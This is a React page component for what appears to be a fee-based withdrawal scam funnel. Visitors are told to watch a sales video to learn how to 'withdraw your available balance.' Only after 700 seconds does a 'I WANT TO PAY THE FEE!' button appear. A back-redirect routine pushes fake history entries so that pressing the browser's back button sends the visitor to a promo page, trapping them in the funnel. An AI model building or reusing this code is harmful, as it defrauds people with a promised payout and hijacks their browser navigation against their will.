import Button from "@/components/button";
import Comments from "@/components/comments";
import PlacesAlert from '@/components/places-alert';
import VSLBlackRock from "@/components/videos/vsl-black-rock";
import { useLayer } from '@/context/layer-provider';
import { useEffect, useState } from 'react';
import { CheckCheck, Loader2 } from 'lucide-react';

export default function Page({
  active,
  handleClick,
}:{
  active: boolean,
  handleClick: () => void,
}) {

  // COMPONENT STATES
  const [visible, setVisible] = useState<boolean>(false);

  // IMPORT CONTEXT DATA
  const userLayerData = useLayer();

  // USER LAYER DATA
  const userHost = userLayerData.host;
  const userFrontLink = userLayerData.frontLink;

  // SET CONTENT DATA
  const VSL = VSLBlackRock;
  const videoId = "69359e59332125736afe6e6e";
  const backLink = `https://${userHost}/promo`;
  const pitchTime = 700;

  // VIDEO VERIFY
  useEffect(() => {
    if (!visible) {
      // Tenta diferentes chaves possíveis no localStorage
      const possibleKeys = [
        videoId + '-resume',
        'vid-' + videoId + '-resume',
        videoId + '-time',
        'vid-' + videoId + '-time',
      ];
      
      const checkVideoTime = () => {
        for (const key of possibleKeys) {
          const storedValue = localStorage.getItem(key);
          if (!storedValue) continue;
          
          const storedVideoTime = Number(storedValue);
          if (isNaN(storedVideoTime) || storedVideoTime <= 0) continue;
          
          // Converte milissegundos para segundos se necessário
          const videoTimeInSeconds = storedVideoTime > 60000 ? storedVideoTime / 1000 : storedVideoTime;
          
          if (videoTimeInSeconds > pitchTime) {
            setVisible(true);
            return;
          };
        }
      };

      // Verifica imediatamente
      checkVideoTime();
      
      // Verifica a cada 1 segundo
      const intervalId = setInterval(checkVideoTime, 1000);
      
      // Também escuta eventos de storage (caso o player atualize o localStorage)
      const handleStorageChange = (e: StorageEvent) => {
        if (e.key && possibleKeys.includes(e.key)) {
          checkVideoTime();
        };
      };
      
      window.addEventListener('storage', handleStorageChange);
      
      return () => {
        clearInterval(intervalId);
        window.removeEventListener('storage', handleStorageChange);
      };
    };
  }, [videoId, visible, pitchTime]);

  // BACK REDIRECT
  useEffect(() => {
    function setBackRedirect(url: string) {
      let urlBackRedirect = url;
      urlBackRedirect =
        urlBackRedirect.trim() +
        (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
        document.location.search.replace('?', '').toString();
      history.pushState({}, '', location.href);
      history.pushState({}, '', location.href);
      history.pushState({}, '', location.href);
      window.addEventListener('popstate', () => {
        console.log('onpopstate', urlBackRedirect);
        setTimeout(() => {
          location.href = urlBackRedirect;
        }, 1);
      });
    };

    setBackRedirect(backLink);
  }, [backLink]);

  return (
    <>
      <div className="flex flex-col text-center text-sm rounded-3xl gap-5 bg-gradient-to-t appear border-t px-4 py-6 from-gray-50 to-gray-200/50 border-gray-300">
        <span className="text-base sm:text-2xl font-semibold text-balance tracking-tight">
        🚨 ATTENTION! Watch the video to the end to understand how to withdraw your available balance. ⬇️
        </span>
        <PlacesAlert visible={visible} />
      </div>
      <div className="flex flex-col items-center gap-8 relative -mt-4">
        <VSL />
        {visible && (
          <a href={userFrontLink}>
            <Button
              onClick={handleClick}
              disabled={active}
              className="pulse border-b-4 !px-6 !py-3 !bg-green-500 !border-green-600 hover:!bg-green-600"
            >
              {active ? (
                <Loader2 className="size-5 animate-spin" />
              ):(
                <CheckCheck className="size-5" />
              )}
              <span>I WANT TO PAY THE FEE!</span>
            </Button>
          </a>
        )}
      </div>
      {!visible && (
        <div className="text-sm text-center p-2">
          🔊 Check if your sound is turned on
        </div>
      )}
      <Comments />
    </>
  );
  
};